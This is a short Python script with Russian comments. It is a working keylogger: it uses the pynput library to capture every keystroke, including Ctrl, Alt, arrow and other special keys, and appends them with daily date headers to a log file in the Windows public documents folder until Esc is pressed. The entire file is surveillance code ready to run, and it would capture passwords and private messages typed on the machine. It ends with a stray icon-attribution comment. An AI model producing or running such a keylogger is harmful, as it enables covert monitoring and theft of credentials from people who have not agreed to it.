from pynput import keyboard
from datetime import datetime
import os

# ===== НАСТРОЙКИ =====
LOG_FILE = r"C:\Users\Public\Documents\key_log.txt"
# =====================

# Создаём папку для логов, если её нет
log_dir = os.path.dirname(LOG_FILE)
if log_dir and not os.path.exists(log_dir):
    os.makedirs(log_dir, exist_ok=True)

current_date = None
file_handle = None

def get_file_handle():
    global current_date, file_handle
    today = datetime.now().strftime("%Y-%m-%d")
    if current_date != today:
        if file_handle:
            file_handle.write("\n")
            file_handle.close()
        # Кодировка Windows-1251 для нормального отображения в блокноте
        file_handle = open(LOG_FILE, "a", encoding="cp1251", errors="replace")
        file_handle.write(f"\n{today}:\n")
        current_date = today
    return file_handle

def on_press(key):
    f = get_file_handle()
    try:
        # Обычный символ (буква, цифра, знак)
        f.write(key.char)
    except AttributeError:
        # Специальные клавиши
        k = str(key).replace("Key.", "")
        if k == "space":
            f.write(" ")
        elif k == "enter":
            f.write("\n")
        elif k == "backspace":
            f.write("←")
        elif k == "tab":
            f.write("→")
        elif k in ("shift", "shift_r", "shift_l"):
            pass  # Shift игнорируем
        elif k in ("ctrl_l", "ctrl_r"):
            f.write(" [ctrl] ")
        elif k in ("alt_l", "alt_r"):
            f.write(" [alt] ")
        elif k.startswith("up"):
            f.write(" [↑] ")
        elif k.startswith("down"):
            f.write(" [↓] ")
        elif k.startswith("left"):
            f.write(" [←] ")
        elif k.startswith("right"):
            f.write(" [→] ")
        else:
            f.write(f" [{k}] ")
    f.flush()

def on_release(key):
    if key == keyboard.Key.esc:
        global file_handle
        if file_handle:
            file_handle.close()
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# <a target="_blank" href="https://icons8.com/icon/Gn5LiwGk4XF8/program">Program</a> icon by <a target="_blank" href="https://icons8.com">Icons8</a>
# icon from ICON8.COM